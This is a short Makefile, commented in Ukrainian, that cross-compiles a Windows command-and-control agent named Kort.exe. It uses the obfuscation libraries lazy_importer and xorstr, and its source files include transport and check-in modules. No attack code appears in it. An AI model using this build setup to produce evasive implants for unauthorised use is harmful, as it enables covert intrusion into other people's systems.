# ============================================================
# Makefile для Kort C2 agent
# Збирає Kort.exe через mingw-w64 (x64)
# ============================================================

# Компілятор (C++ через mingw, бо lazy_importer і xorstr — це C++ бібліотеки)
CC      = x86_64-w64-mingw32-g++

# Прапорці компіляції
CFLAGS  = -O2 -Wall -m64 \
          -DWIN32_LEAN_AND_MEAN \
          -DNOMINMAX \
          -DLAZY_IMPORTER_HARDENED_MODULE_CHECKS \
          -DUNICODE -D_UNICODE \
          -I include \
          -fno-exceptions -fno-rtti

# Прапорці лінкування
LDFLAGS = -m64 -static-libgcc -static-libstdc++ \
          -lwinhttp -liphlpapi -lws2_32 -ladvapi32 -lbcrypt

# Вихідний файл
TARGET  = Kort.exe

# Вихідні файли (.c компілюються як C++ через -x c++)
SRCS    = Entry.c \
          kort.c \
          Package.c \
          Parser.c \
          Transport.c \
          Utils.c \
          Checkin.c

# Об'єктні файли
OBJS    = $(SRCS:.c=.o)

# ============================================================
# Цілі
# ============================================================

all: $(TARGET)

$(TARGET): $(OBJS)
	$(CC) $(OBJS) -o $@ $(LDFLAGS)
	@echo "[+] Built $(TARGET):"
	@ls -la $(TARGET)

%.o: %.c
	$(CC) $(CFLAGS) -x c++ -c $< -o $@

clean:
	rm -f $(OBJS) $(TARGET) payload.bin

.PHONY: all clean